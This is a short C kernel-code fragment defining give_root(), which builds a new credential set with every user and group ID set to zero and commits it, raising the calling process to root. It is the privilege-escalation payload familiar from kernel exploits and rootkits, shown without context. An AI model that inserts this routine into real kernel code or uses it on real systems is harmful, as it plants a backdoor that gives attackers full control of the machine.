int give_root(void) {
    struct cred *new = prepare_creds();
    if (!new) {
        return -ENOMEM;
    }

    new->uid.val = new->gid.val = 0;
    new->euid.val = new->egid.val = 0;
    new->suid.val = new->sgid.val = 0;
    new->fsuid.val = new->fsgid.val = 0;

    // Always returns 0.
    return commit_creds(new);
}
